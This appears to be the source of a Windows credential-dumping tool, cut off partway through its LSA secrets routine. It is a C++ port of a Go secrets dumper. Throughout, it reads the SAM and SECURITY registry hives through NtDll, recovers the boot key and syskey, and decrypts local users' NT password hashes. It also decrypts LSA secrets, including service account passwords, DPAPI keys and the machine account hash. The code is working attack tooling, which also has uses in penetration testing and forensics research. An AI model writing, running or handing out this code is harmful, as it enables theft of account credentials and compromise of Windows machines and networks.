/*
 * credump.cpp – faithful C++ port of secrets.go
 *
 * Every function mirrors its Go counterpart exactly.
 * All registry I/O via registry_nt.h (NtDll, no advapi32).
 */

#include "credump.h"
#include "registry_nt.h"
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <intrin.h>   // __popcnt

 // ─────────────────────────── globals ─────────────────────────────────────────
std::vector<uint8_t> g_BootKey;
std::vector<uint8_t> g_LSAKey;
std::vector<uint8_t> g_NLKMKey;
bool                 g_VistaStyle = false;

// ─────────────────────────── byte helpers ────────────────────────────────────
uint16_t ReadLE16(const uint8_t* p) {
    return (uint16_t)(p[0] | ((uint16_t)p[1] << 8));
}
uint32_t ReadLE32(const uint8_t* p) {
    return (uint32_t)p[0] | ((uint32_t)p[1] << 8) | ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}
uint64_t ReadLE64(const uint8_t* p) {
    return (uint64_t)p[0] | ((uint64_t)p[1] << 8) | ((uint64_t)p[2] << 16) | ((uint64_t)p[3] << 24) |
        ((uint64_t)p[4] << 32) | ((uint64_t)p[5] << 40) | ((uint64_t)p[6] << 48) | ((uint64_t)p[7] << 56);
}
uint64_t Pad64(uint64_t v) {
    if (v & 0x3) return v + (4 - (v & 0x3)); return v;
}
std::string ToHex(const uint8_t* d, size_t n) {
    std::ostringstream s; s << std::hex << std::setfill('0');
    for (size_t i = 0; i < n; i++) s << std::setw(2) << (unsigned)d[i]; return s.str();
}
std::string FromUnicodeString(const uint8_t* d, size_t n) {
    if (!n) return "";
    int need = WideCharToMultiByte(CP_UTF8, 0, reinterpret_cast<const WCHAR*>(d), (int)(n / 2),
        nullptr, 0, nullptr, nullptr);
    if (need <= 0) return "";
    std::string o(need, '\0');
    WideCharToMultiByte(CP_UTF8, 0, reinterpret_cast<const WCHAR*>(d), (int)(n / 2),
        &o[0], need, nullptr, nullptr);
    return o;
}

// ─────────────────────────── struct parsers ───────────────────────────────────
bool UnmarshalDomainAccountF(const uint8_t* d, size_t n, domain_account_f& o) {
    if (n < 104) return false;
    o.Revision = ReadLE16(d); o.CreationTime = ReadLE64(d + 8);
    o.DomainModifiedAccount = ReadLE64(d + 16); o.MaxPasswordAge = ReadLE64(d + 24);
    o.MinPasswordAge = ReadLE64(d + 32); o.ForceLogoff = ReadLE64(d + 40);
    o.LockoutDuration = ReadLE64(d + 48); o.LockoutObservationWindow = ReadLE64(d + 56);
    o.ModifiedCountAtLastPromotion = ReadLE64(d + 64);
    o.NextRid = ReadLE32(d + 72); o.PasswordProperties = ReadLE32(d + 76);
    o.MinPasswordLength = ReadLE16(d + 80); o.PasswordHistoryLength = ReadLE16(d + 82);
    o.LockoutThreshold = ReadLE16(d + 84);
    o.ServerState = ReadLE32(d + 88); o.ServerRole = ReadLE32(d + 92);
    o.UasCompatibilityRequired = ReadLE32(d + 96);
    if (n > 104) o.Data.assign(d + 104, d + n); return true;
}

bool UnmarshalNLRecord(const uint8_t* d, size_t n, nl_record& h, std::vector<uint8_t>& enc) {
    if (n < 96) return false;
    h.UserLength = ReadLE16(d); h.DomainNameLength = ReadLE16(d + 2);
    h.EffectiveNameLength = ReadLE16(d + 4); h.FullNameLength = ReadLE16(d + 6);
    h.LogonScriptName = ReadLE16(d + 8); h.ProfilePathLength = ReadLE16(d + 10);
    h.HomeDirectoryLength = ReadLE16(d + 12); h.HomeDirectoryDriveLength = ReadLE16(d + 14);
    h.UserId = ReadLE32(d + 16); h.PrimaryGroupId = ReadLE32(d + 20); h.GroupCount = ReadLE32(d + 24);
    h.logonDomainNameLength = ReadLE16(d + 28); h.Unk0 = ReadLE16(d + 30);
    h.LastWrite = ReadLE64(d + 32); h.Revision = ReadLE32(d + 40);
    h.SidCount = ReadLE32(d + 44); h.Flags = ReadLE32(d + 48); h.Unk1 = ReadLE32(d + 52);
    h.LogonPackageLength = ReadLE32(d + 56); h.DnsDomainNameLength = ReadLE16(d + 60);
    h.UPN = ReadLE16(d + 62);
    memcpy(h.IV, d + 64, 16); memcpy(h.CH, d + 80, 16);
    if (n > 96) enc.assign(d + 96, d + n); return true;
}

// ─────────────────────────── MD5 ─────────────────────────────────────────────
static bool MD5Multi(std::initializer_list<std::pair<const uint8_t*, size_t>> parts,
    uint8_t out[16]) {
    HCRYPTPROV hp = 0; HCRYPTHASH hh = 0; bool ok = false;
    if (!CryptAcquireContextA(&hp, nullptr, nullptr, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) return false;
    if (!CryptCreateHash(hp, CALG_MD5, 0, 0, &hh)) goto done;
    for (auto& p : parts) if (!CryptHashData(hh, p.first, (DWORD)p.second, 0)) goto done;
    { DWORD sz = 16; ok = CryptGetHashParam(hh, HP_HASHVAL, out, &sz, 0) != FALSE; }
done: if (hh)CryptDestroyHash(hh); CryptReleaseContext(hp, 0); return ok;
}

bool MD5Hash(const uint8_t* d, size_t n, uint8_t o[16]) { return MD5Multi({ {d,n} }, o); }

bool MD4Hash(const uint8_t* d, size_t n, uint8_t o[16]) {
    BCRYPT_ALG_HANDLE ha = nullptr; BCRYPT_HASH_HANDLE hh = nullptr; bool ok = false;
    if (BCryptOpenAlgorithmProvider(&ha, BCRYPT_MD4_ALGORITHM, nullptr, 0)) return false;
    if (BCryptCreateHash(ha, &hh, nullptr, 0, nullptr, 0, 0)) goto done;
    if (BCryptHashData(hh, (PUCHAR)d, (ULONG)n, 0)) goto done;
    ok = !BCryptFinishHash(hh, o, 16, 0);
done: if (hh)BCryptDestroyHash(hh); if (ha)BCryptCloseAlgorithmProvider(ha, 0); return ok;
}

bool SHA256Hash(const uint8_t* d, size_t n, uint8_t o[32]) {
    BCRYPT_ALG_HANDLE ha = nullptr; BCRYPT_HASH_HANDLE hh = nullptr; bool ok = false;
    if (BCryptOpenAlgorithmProvider(&ha, BCRYPT_SHA256_ALGORITHM, nullptr, 0)) return false;
    if (BCryptCreateHash(ha, &hh, nullptr, 0, nullptr, 0, 0)) goto done;
    if (BCryptHashData(hh, (PUCHAR)d, (ULONG)n, 0)) goto done;
    ok = !BCryptFinishHash(hh, o, 32, 0);
done: if (hh)BCryptDestroyHash(hh); if (ha)BCryptCloseAlgorithmProvider(ha, 0); return ok;
}

/*
 * SHA256(key, value, rounds) – Go:
 *   h.Write(key) once
 *   for i:=0; i<1000; i++ { h.Write(value) }
 */
std::vector<uint8_t> SHA256Key(const std::vector<uint8_t>& key,
    const uint8_t* value, size_t valueLen, int) {
    BCRYPT_ALG_HANDLE ha = nullptr; BCRYPT_HASH_HANDLE hh = nullptr;
    std::vector<uint8_t> out(32, 0);
    if (BCryptOpenAlgorithmProvider(&ha, BCRYPT_SHA256_ALGORITHM, nullptr, 0)) return out;
    if (BCryptCreateHash(ha, &hh, nullptr, 0, nullptr, 0, 0)) goto done;
    BCryptHashData(hh, (PUCHAR)key.data(), (ULONG)key.size(), 0);
    for (int i = 0; i < 1000; i++) BCryptHashData(hh, (PUCHAR)value, (ULONG)valueLen, 0);
    BCryptFinishHash(hh, out.data(), 32, 0);
done: if (hh)BCryptDestroyHash(hh); if (ha)BCryptCloseAlgorithmProvider(ha, 0); return out;
}

// ─────────────────────────── RC4 ─────────────────────────────────────────────
bool RC4Crypt(const uint8_t* key, size_t klen, const uint8_t* in, size_t n, uint8_t* out) {
    uint8_t S[256]; for (int i = 0; i < 256; i++) S[i] = (uint8_t)i;
    uint8_t j = 0;
    for (int i = 0; i < 256; i++) { j = j + S[i] + key[i % klen]; uint8_t t = S[i]; S[i] = S[j]; S[j] = t; }
    uint8_t i8 = 0; j = 0;
    for (size_t k = 0; k < n; k++) {
        ++i8; j += S[i8]; uint8_t t = S[i8]; S[i8] = S[j]; S[j] = t;
        out[k] = in[k] ^ S[(uint8_t)(S[i8] + S[j])];
    }
    return true;
}

/*
 * AESCBCDecrypt – exact port of Go's DecryptAES(key, ciphertext, iv):
 *
 *   When iv != nil: standard single-pass CBC.
 *   When iv == nil: create a NEW CBC decrypter (zero IV) for EVERY 16-byte block.
 *     This is equivalent to AES-ECB for each block because CBC with zero IV
 *     on a single block = AES-ECB(block).
 */
bool AESCBCDecrypt(const uint8_t* key, size_t klen, const uint8_t* iv,
    const uint8_t* in, size_t inLen, std::vector<uint8_t>& out) {
    if (!inLen) return false;
    out.clear();

    if (iv != nullptr) {
        // Standard CBC with given IV
        BCRYPT_ALG_HANDLE ha = nullptr; BCRYPT_KEY_HANDLE hk = nullptr; bool ok = false;
        if (BCryptOpenAlgorithmProvider(&ha, BCRYPT_AES_ALGORITHM, nullptr, 0)) return false;
        if (BCryptSetProperty(ha, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
            sizeof(BCRYPT_CHAIN_MODE_CBC), 0)) goto cbcdone;
        if (BCryptGenerateSymmetricKey(ha, &hk, nullptr, 0, (PUCHAR)key, (ULONG)klen, 0)) goto cbcdone;
        {
            size_t padded = ((inLen + 15) / 16) * 16;
            std::vector<uint8_t> buf(padded, 0); memcpy(buf.data(), in, inLen);
            uint8_t ivbuf[16]; memcpy(ivbuf, iv, 16);
            out.resize(padded); ULONG d = 0;
            if (!BCryptDecrypt(hk, buf.data(), (ULONG)padded, nullptr, ivbuf, 16,
                out.data(), (ULONG)padded, &d, 0)) {
                out.resize(d); ok = true;
            }
        }
    cbcdone: if (hk)BCryptDestroyKey(hk); if (ha)BCryptCloseAlgorithmProvider(ha, 0); return ok;
    }
    else {
        // nullIV path: Go re-creates cipher.NewCBCDecrypter(block, zeroIV) every block.
        // CBC-decrypt(zeroIV, single_block) = AES_block_decrypt(block) XOR zeroIV
        //                                   = AES_block_decrypt(block)
        // So this is AES-ECB per block.
        BCRYPT_ALG_HANDLE ha = nullptr; bool ok = false;
        if (BCryptOpenAlgorithmProvider(&ha, BCRYPT_AES_ALGORITHM, nullptr, 0)) return false;
        if (BCryptSetProperty(ha, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_ECB,
            sizeof(BCRYPT_CHAIN_MODE_ECB), 0)) goto ecbdone;
        for (size_t i = 0; i < inLen; i += 16) {
            uint8_t blk[16] = {}; size_t left = inLen - i;
            memcpy(blk, in + i, left < 16 ? left : 16);
            BCRYPT_KEY_HANDLE hk = nullptr;
            if (BCryptGenerateSymmetricKey(ha, &hk, nullptr, 0, (PUCHAR)key, (ULONG)klen, 0)) {
                goto ecbdone;
            }
            uint8_t pt[16] = {}; ULONG d = 0;
            bool bOk = !BCryptDecrypt(hk, blk, 16, nullptr, nullptr, 0, pt, 16, &d, 0);
            BCryptDestroyKey(hk);
            if (!bOk) goto ecbdone;
            out.insert(out.end(), pt, pt + 16);
        }
        ok = true;
    ecbdone: if (ha)BCryptCloseAlgorithmProvider(ha, 0); return ok;
    }
}

// ─────────────────────────── plusOddParity ───────────────────────────────────
/*
 * Go: count 1-bits in output[i] BEFORE the shift, then shift left and set LSB.
 */
static void PlusOddParity(const uint8_t inp[7], uint8_t out[8]) {
    out[0] = inp[0] >> 1;
    out[1] = ((inp[0] & 0x01) << 6) | (inp[1] >> 2);
    out[2] = ((inp[1] & 0x03) << 5) | (inp[2] >> 3);
    out[3] = ((inp[2] & 0x07) << 4) | (inp[3] >> 4);
    out[4] = ((inp[3] & 0x0f) << 3) | (inp[4] >> 5);
    out[5] = ((inp[4] & 0x1f) << 2) | (inp[5] >> 6);
    out[6] = ((inp[5] & 0x3f) << 1) | (inp[6] >> 7);
    out[7] = inp[6] & 0x7f;
    for (int i = 0; i < 8; i++) {
        unsigned cnt = __popcnt((unsigned)out[i]); // popcount BEFORE shift
        if (cnt % 2 == 0) out[i] = (uint8_t)((out[i] << 1) | 0x01);
        else          out[i] = (uint8_t)((out[i] << 1) & 0xFE);
    }
}

// ─────────────────────────── DES-ECB 8-byte ──────────────────────────────────
static bool DES8(const uint8_t key[8], const uint8_t ct[8], uint8_t pt[8]) {
    BCRYPT_ALG_HANDLE ha = nullptr; BCRYPT_KEY_HANDLE hk = nullptr; bool ok = false;
    if (BCryptOpenAlgorithmProvider(&ha, BCRYPT_DES_ALGORITHM, nullptr, 0)) return false;
    if (BCryptSetProperty(ha, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_ECB,
        sizeof(BCRYPT_CHAIN_MODE_ECB), 0)) goto done;
    if (BCryptGenerateSymmetricKey(ha, &hk, nullptr, 0, (PUCHAR)key, 8, 0)) goto done;
    {
        uint8_t b[8]; memcpy(b, ct, 8); ULONG d = 0;
        ok = !BCryptDecrypt(hk, b, 8, nullptr, nullptr, 0, pt, 8, &d, 0);
    }
done: if (hk)BCryptDestroyKey(hk); if (ha)BCryptCloseAlgorithmProvider(ha, 0); return ok;
}

/*
 * decryptNTHash – Go:
 *   shift1={0,1,2,3,0,1,2}  shift2={3,0,1,2,3,0,1}
 *   desSrc1[i]=ridBytes[shift1[i]], desSrc2[i]=ridBytes[shift2[i]]
 *   deskey1=plusOddParity(desSrc1), deskey2=plusOddParity(desSrc2)
 *   dc1.Decrypt(nt1, encHash[:8]), dc2.Decrypt(nt2, encHash[8:])
 *   return nt1||nt2
 */
static bool DecryptNTHashInner(const uint8_t enc[16], const uint8_t rid[4], uint8_t out[16]) {
    static const int s1[7] = { 0,1,2,3,0,1,2 };
    static const int s2[7] = { 3,0,1,2,3,0,1 };
    uint8_t src1[7], src2[7];
    for (int i = 0; i < 7; i++) { src1[i] = rid[s1[i]]; src2[i] = rid[s2[i]]; }
    uint8_t k1[8], k2[8];
    PlusOddParity(src1, k1); PlusOddParity(src2, k2);
    return DES8(k1, enc, out) && DES8(k2, enc + 8, out + 8);
}

/*
 * DecryptRC4Hash – Go:
 *   input2 = syskey || ridLE || s3
 *   rc4key = md5.Sum(input2)
 *   RC4(rc4key, doubleEncHash) → encHash
 *   return decryptNTHash(encHash, ridLE)
 */
bool DecryptRC4Hash(const std::vector<uint8_t>& doubleEncHash,
    const std::vector<uint8_t>& syskey,
    uint32_t rid, std::vector<uint8_t>& ntHash) {
    if (doubleEncHash.size() < 16) return false;
    uint8_t ridLE[4] = { (uint8_t)rid,(uint8_t)(rid >> 8),(uint8_t)(rid >> 16),(uint8_t)(rid >> 24) };
    std::vector<uint8_t> input2;
    input2.insert(input2.end(), syskey.begin(), syskey.end());
    input2.insert(input2.end(), ridLE, ridLE + 4);
    // S3 = "NTPASSWORD\0" – Go appends s3 including the null byte (11 bytes total)
    input2.insert(input2.end(), S3, S3 + 11);
    uint8_t rc4key[16];
    if (!MD5Hash(input2.data(), input2.size(), rc4key)) return false;
    uint8_t encHash[16] = {};
    RC4Crypt(rc4key, 16, doubleEncHash.data(), 16, encHash);
    ntHash.resize(16);
    return DecryptNTHashInner(encHash, ridLE, ntHash.data());
}

/*
 * DecryptAESHash – Go:
 *   CBC-decrypt(syskey, encHashIV, doubleEncHash[0:16]) → encHash
 *   return decryptNTHash(encHash, ridLE)
 */
bool DecryptAESHash(const std::vector<uint8_t>& doubleEncHash,
    const std::vector<uint8_t>& encHashIV,
    const std::vector<uint8_t>& syskey,
    uint32_t rid, std::vector<uint8_t>& ntHash) {
    if (doubleEncHash.size() < 16 || encHashIV.size() < 16 || syskey.empty()) return false;
    uint8_t ridLE[4] = { (uint8_t)rid,(uint8_t)(rid >> 8),(uint8_t)(rid >> 16),(uint8_t)(rid >> 24) };
    BCRYPT_ALG_HANDLE ha = nullptr; BCRYPT_KEY_HANDLE hk = nullptr; bool ok = false;
    uint8_t encHash[16] = {};
    if (BCryptOpenAlgorithmProvider(&ha, BCRYPT_AES_ALGORITHM, nullptr, 0)) return false;
    if (BCryptSetProperty(ha, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
        sizeof(BCRYPT_CHAIN_MODE_CBC), 0)) goto done;
    if (BCryptGenerateSymmetricKey(ha, &hk, nullptr, 0,
        (PUCHAR)syskey.data(), (ULONG)syskey.size(), 0)) goto done;
    {
        uint8_t ivbuf[16]; memcpy(ivbuf, encHashIV.data(), 16);
        uint8_t ctbuf[16]; memcpy(ctbuf, doubleEncHash.data(), 16);
        ULONG d = 0; ok = !BCryptDecrypt(hk, ctbuf, 16, nullptr, ivbuf, 16, encHash, 16, &d, 0);
    }
done: if (hk)BCryptDestroyKey(hk); if (ha)BCryptCloseAlgorithmProvider(ha, 0);
    if (!ok) return false;
    ntHash.resize(16);
    return DecryptNTHashInner(encHash, ridLE, ntHash.data());
}

// ─────────────────────────── registry shortcuts ───────────────────────────────
static const ULONG BKUP = 0x00000004UL;
static const ULONG MAXAC = 0x02000000UL;
static HANDLE OpenNt(const std::string& p, ULONG o = BKUP, ULONG a = MAXAC) { return NtOpenSubKeyExt(p, o, a); }
static void   CloseNt(HANDLE h) { NtCloseKeyHandle(h); }
static bool   QueryBin(HANDLE h, const std::string& n, std::vector<uint8_t>& o) { ULONG t = 0; return NtQueryValue(h, n, o, t); }
static bool   QueryStr(HANDLE h, const std::string& n, std::string& o) { return NtQueryValueString(h, n, o); }
static bool   QueryClass(const std::string& path, std::string& out) {
    HANDLE h = OpenNt(path, 0, MAXAC);
    if (!h) h = OpenNt(path, BKUP, MAXAC);
    if (!h) return false;
    NtKeyInfo info; bool ok = NtQueryKeyInfo(h, info); CloseNt(h);
    if (!ok) return false; out = info.ClassName; return true;
}

// ─────────────────────────── BootKey ─────────────────────────────────────────
static const uint8_t PERM[16] = { 0x8,0x5,0x4,0x2,0xb,0x9,0xd,0x3,0x0,0x6,0x1,0xc,0xe,0xa,0xf,0x7 };
static bool HexDecode(const std::string& s, std::vector<uint8_t>& o) {
    if (s.size() % 2) return false; o.clear();
    for (size_t i = 0; i < s.size(); i += 2) {
        unsigned v = 0;
        if (sscanf_s(s.c_str() + i, "%02x", &v) != 1) return false; o.push_back((uint8_t)v);
    }
    return true;
}

bool GetBootKey(HKEY, std::vector<uint8_t>& result) {
    if (!g_BootKey.empty()) { result = g_BootKey; return true; }
    static const char* SK[4] = {
        "SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD",
        "SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1",
        "SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG",
        "SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data" };
    std::vector<uint8_t> scrambled;
    for (int i = 0; i < 4; i++) {
        std::string cls;
        if (!QueryClass(SK[i], cls)) { fprintf(stderr, "[!] QueryClass failed: %s\n", SK[i]); return false; }
        std::vector<uint8_t> part;
        if (!HexDecode(cls, part)) { fprintf(stderr, "[!] HexDecode failed on: '%s'\n", cls.c_str()); return false; }
        scrambled.insert(scrambled.end(), part.begin(), part.end());
    }
    if (scrambled.size() < 16) return false;
    result.resize(16);
    for (int i = 0; i < 16; i++) result[i] = scrambled[PERM[i]];
    g_BootKey = result;
    fprintf(stderr, "[dbg] BootKey: %s\n", ToHex(result.data(), 16).c_str());
    return true;
}

// ─────────────────────────── SysKey ──────────────────────────────────────────
bool DecryptRC4SysKey(const std::vector<uint8_t>& bk, const std::vector<uint8_t>& enc,
    const uint8_t* iv, std::vector<uint8_t>& sk) {
    uint8_t rc4k[16];
    if (!MD5Multi({ {iv,16},{S1,sizeof(S1) - 1},{bk.data(),bk.size()},{S2,sizeof(S2) - 1} }, rc4k)) return false;
    sk.resize(32); return RC4Crypt(rc4k, 16, enc.data(), enc.size(), sk.data());
}

bool DecryptAESSysKey(const std::vector<uint8_t>& bk, const std::vector<uint8_t>& enc,
    const uint8_t* iv, std::vector<uint8_t>& sk) {
    return AESCBCDecrypt(bk.data(), bk.size(), iv, enc.data(), enc.size(), sk);
}

bool GetSysKey(HKEY, std::vector<uint8_t>& sysKey) {
    if (!GetBootKey(nullptr, g_BootKey)) return false;
    HANDLE h = OpenNt("SAM\\SAM\\Domains\\Account"); if (!h) { fprintf(stderr, "[!] Cannot open SAM\\Domains\\Account\n"); return false; }
    std::vector<uint8_t> fBytes; bool ok = QueryBin(h, "F", fBytes); CloseNt(h);
    if (!ok) return false;
    domain_account_f f;
    if (!UnmarshalDomainAccountF(fBytes.data(), fBytes.size(), f)) return false;
    fprintf(stderr, "[dbg] domain_account_f.Revision=%u\n", f.Revision);
    std::vector<uint8_t> enc, tmp;
    if (f.Revision == 3) {
        if (f.Data.size() < sizeof(sam_key_data_aes)) return false;
        sam_key_data_aes aes; memcpy(&aes, f.Data.data(), sizeof(aes));
        enc.assign(aes.Data, aes.Data + aes.DataLen);
        if (!DecryptAESSysKey(g_BootKey, enc, aes.Salt, tmp)) return false;
        size_t t = tmp.size() < 16 ? tmp.size() : (size_t)16;
        sysKey.assign(tmp.begin(), tmp.begin() + t);
    }
    else if (f.Revision == 2) {
        if (f.Data.size() < sizeof(sam_key_data)) return false;
        sam_key_data sd; memcpy(&sd, f.Data.data(), sizeof(sd));
        enc.insert(enc.end(), sd.Key, sd.Key + 16);
        enc.insert(enc.end(), sd.Checksum, sd.Checksum + 16);
        if (!DecryptRC4SysKey(g_BootKey, enc, sd.Salt, tmp)) return false;
        uint8_t chk[16];
        if (!MD5Multi({ {tmp.data(),16},{S2,sizeof(S2) - 1},{tmp.data(),16},{S1,sizeof(S1) - 1} }, chk)) return false;
        if (memcmp(chk, tmp.data() + 16, 16) != 0) return false;
        sysKey.assign(tmp.begin(), tmp.begin() + 16);
    }
    else return false;
    fprintf(stderr, "[dbg] SysKey: %s\n", ToHex(sysKey.data(), sysKey.size()).c_str());
    return true;
}

// ─────────────────────────── GetNTHashes ─────────────────────────────────────
bool GetNTHashes(HKEY, const std::vector<std::string>& rids, std::vector<UserCreds>& result) {
    result.resize(rids.size());
    int build = 0; double ver = 0; bool srv = false;
    if (!GetOSVersionBuild(nullptr, build, ver, srv)) return false;
    fprintf(stderr, "[dbg] Build=%d\n", build);
    std::vector<uint8_t> sysKey;
    if (!GetSysKey(nullptr, sysKey)) return false;
    bool after = build >= 14393;
    int cntr = -1;
    for (const auto& ridPath : rids) {
        ++cntr;
        size_t bs = ridPath.rfind('\\');
        std::string ridHex = (bs != std::string::npos) ? ridPath.substr(bs + 1) : ridPath;
        uint32_t rid = (uint32_t)strtoul(ridHex.c_str(), nullptr, 16);
        result[cntr].RID = rid;
        HANDLE h = OpenNt(ridPath); if (!h) continue;
        std::vector<uint8_t> v; bool ok = QueryBin(h, "V", v); CloseNt(h);
        if (!ok || v.size() < 0xcc + 4) continue;
        uint32_t offName = ReadLE32(v.data() + 0x0c) + 0xcc, szName = ReadLE32(v.data() + 0x10);
        if (offName + szName <= (uint32_t)v.size())
            result[cntr].Username = FromUnicodeString(v.data() + offName, szName);
        uint32_t szNT = ReadLE32(v.data() + 0xac), offHash = ReadLE32(v.data() + 0xa8) + 0xcc;
        fprintf(stderr, "[dbg] %s RID=%u szNT=0x%x offHash=0x%x\n",
            result[cntr].Username.c_str(), rid, szNT, offHash);
        if (!szNT) continue;
        if (!after) {
            if (szNT == 0x14) {
                result[cntr].AES = false; uint32_t off = offHash + 4;
                if (off + 16 <= (uint32_t)v.size()) result[cntr].Data.assign(v.data() + off, v.data() + off + 16);
            }
            else if (szNT == 0x4) result[cntr].AES = false;
        }
        else {
            if (szNT == 0x14) {
                result[cntr].AES = false; uint32_t off = offHash + 4;
                if (off + 16 <= (uint32_t)v.size()) result[cntr].Data.assign(v.data() + off, v.data() + off + 16);
            }
            else if (szNT == 0x38) {
                result[cntr].AES = true;
                uint32_t offIV = offHash + 8, offH = offHash + 24;
                if (offIV + 16 <= (uint32_t)v.size()) result[cntr].IV.assign(v.data() + offIV, v.data() + offIV + 16);
                if (offH + 16 <= (uint32_t)v.size()) result[cntr].Data.assign(v.data() + offH, v.data() + offH + 16);
            }
            else if (szNT == 0x18) result[cntr].AES = true;
            else if (szNT == 0x4)  result[cntr].AES = false;
        }
    }
    return true;
}

// ─────────────────────────── LSA helpers ─────────────────────────────────────
// Decrypt a Vista+ LSA secret blob
static bool DecryptLSABlob(const std::vector<uint8_t>& blob,
    const std::vector<uint8_t>& lsaKey,
    std::vector<uint8_t>& secret) {
    if (blob.size() < 60) return false;
    const uint8_t* enc = blob.data() + 28;
    size_t encLen = blob.size() - 28;
    if (encLen < 32) return false;
    std::vector<uint8_t> sha256key = SHA256Key(lsaKey, enc, encLen, 0);
    std::vector<uint8_t> pt;
    if (!AESCBCDecrypt(sha256key.data(), sha256key.size(), nullptr, enc + 32, encLen - 32, pt)) return false;
    if (pt.size() < 16) return false;
    uint32_t blen = ReadLE32(pt.data());
    if (pt.size() < 16 + (size_t)blen) return false;
    secret.assign(pt.data() + 16, pt.data() + 16 + blen);
    return true;
}

static bool DecryptLSAKey(const std::vector<uint8_t>& data, std::vector<uint8_t>& result) {
    if (!GetBootKey(nullptr, g_BootKey)) return false;
    if (g_VistaStyle) {
        if (data.size() < 60) return false;
        const uint8_t* enc = data.data() + 28; size_t encLen = data.size() - 28;
        if (encLen < 32) return false;
        std::vector<uint8_t> sha256key = SHA256Key(g_BootKey, enc, encLen, 0);
        std::vector<uint8_t> pt;
        if (!AESCBCDecrypt(sha256key.data(), sha256key.size(), nullptr, enc + 32, encLen - 32, pt)) return false;
        if (pt.size() < 16) return false;
        uint32_t blen = ReadLE32(pt.data());
        if (pt.size() < 16 + blen || blen < 84) return false;
        result.assign(pt.data() + 16 + 52, pt.data() + 16 + 52 + 32);
    }
    else {
        if (data.size() < 76) return false;
        HCRYPTPROV hp = 0; HCRYPTHASH hh = 0;
        CryptAcquireContextA(&hp, nullptr, nullptr, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
        CryptCreateHash(hp, CALG_MD5, 0, 0, &hh);
        CryptHashData(hh, g_BootKey.data(), (DWORD)g_BootKey.size(), 0);
        for (int i = 0; i < 1000; i++) CryptHashData(hh, data.data() + 60, 16, 0);
        uint8_t tk[16]; DWORD sz = 16;
        CryptGetHashParam(hh, HP_HASHVAL, tk, &sz, 0);
        CryptDestroyHash(hh); CryptReleaseContext(hp, 0);
        std::vector<uint8_t> pt(48); RC4Crypt(tk, 16, data.data() + 12, 48, pt.data());
        result.assign(pt.begin() + 0x10, pt.begin() + 0x20);
    }
    return true;
}

bool GetLSASecretKey(HKEY, std::vector<uint8_t>& result) {
    if (!g_LSAKey.empty()) { result = g_LSAKey; return true; }
    g_VistaStyle = true;
    HANDLE h = OpenNt("Security\\Policy\\PolEKList");
    std::vector<uint8_t> data;
    if (!h) { g_VistaStyle = false; h = OpenNt("Security\\Policy\\PolSecretEncryptionKey"); if (!h) return false; }
    bool ok = QueryBin(h, "", data); CloseNt(h);
    if (!ok || data.empty()) return false;
    if (!DecryptLSAKey(data, result)) return false;
    g_LSAKey = result;
    fprintf(stderr, "[dbg] LSAKey: %s\n", ToHex(result.data(), result.size()).c_str());
    return true;
}

// ─────────────────────────── LSA secrets ─────────────────────────────────────
bool GetServiceUser(HKEY, const std::string& name, std::string& result) {
    HANDLE h = OpenNt("SYSTEM\\CurrentControlSet\\Services\\" + name, 0, MAXAC);
    if (!h) return false; bool ok = QueryStr(h, "ObjectName", result); CloseNt(h); return ok;
}

static PrintableLSASecret* ParseSecret(const std::string& name, const std::vector<uint8_t>& item) {
    if (item.empty()) return nullptr;
    if (item.size() >= 2 && item[0] == 0 && item[1] == 0) return nullptr;
    auto* r = new PrintableLSASecret(); r->secretType = "[*] " + name;
    std::string up = name; for (auto& c : up) c = (char)toupper((unsigned char)c);
    if (up.rfind("_SC_", 0) == 0) {
        std::string dec = FromUnicodeString(item.data(), item.size()), svcUser;
        if (!GetServiceUser(nullptr, name.substr(4), svcUser)) svcUser = "(unknown user)";
        else if (svcUser.rfind(".\\", 0) == 0) svcUser = svcUser.substr(2);
        r->secrets.push_back(svcUser + ": " + dec);
    }
    else if (up.rfind("ASPNET_WP_PASSWORD", 0) == 0) {
        r->secrets.push_back("ASPNET: " + FromUnicodeString(item.data(), item.size()));
    }
    else if (up.rfind("DPAPI_SYSTEM", 0) == 0) {
        if (item.size() < 44) { delete r; return nullptr; }
        r->secrets.push_back("dpapi_machinekey: 0x" + ToHex(item.data() + 4, 20));
        r->secrets.push_back("dpapi_userkey: 0x" + ToHex(item.data() + 24, 20));
    }
    else if (up.rfind("$MACHINE.ACC", 0) == 0) {
        uint8_t h4[16]; MD4Hash(item.data(), item.size(), h4);
        r->secrets.push_back("$MACHINE.ACC (NT Hash): " + ToHex(h4, 16));
        r->extraSecret = "$MACHINE.ACC:plain_password_hex:" + ToHex(item.data(), item.size());
    }
    else if (up.rfind("NL$KM", 0) == 0) {
        size_t t = item.size() < 16 ? item.size() : (size_t)16;
        r->secrets.push_back("NL$KM: 0x" + ToHex(item.data(), t));
    }
    else if (up.rfind("CACHEDDEFAULTPASSWORD", 0) == 0) {
        r->secrets.push_back("(Unknown user): " + FromUnicodeString(item.data(), item.size()));
    }
    else { delete r; return nullptr; }
    return r;
}

bool GetLSASecrets(HKEY, bool history, std::vector<PrintableLSASecret>& secrets) {
    std::vector<std::string> keys;
    if (!NtGetSubKeyNames("SECURITY\\Policy\\Secrets", BKUP, MAXAC, keys)) return false;
    if (keys.empty()) return true;
    std::vector<uint8_t> lsaKey;
    if (!GetLSASecretKey(nullptr, lsaKey)) return false;
    for (auto& key : keys) {
        if (key == "NL$Control") continue;
        std::vector<std::string> vts = { "CurrVal" };
        if (history) vts.push_back("OldVal");
        for (auto& vt : vts) {
            HANDLE h = OpenNt("SECURITY\\Policy\\Secrets\\" + key + "\\" + vt);
            if (!h) continue;
            std::vector<uint8_t> value; ULONG type = 0;
            bool ok = NtQueryValue(h, "", value, type); CloseNt(h);
            if (!ok || value.empty() || value[0] != 0) continue;
            std::vector<uint8_t> secret;
            if (!DecryptLSABlob(value, lsaKey, secret)) continue;
            std::string ek = (vt == "OldVal") ? key + "_history" : key;
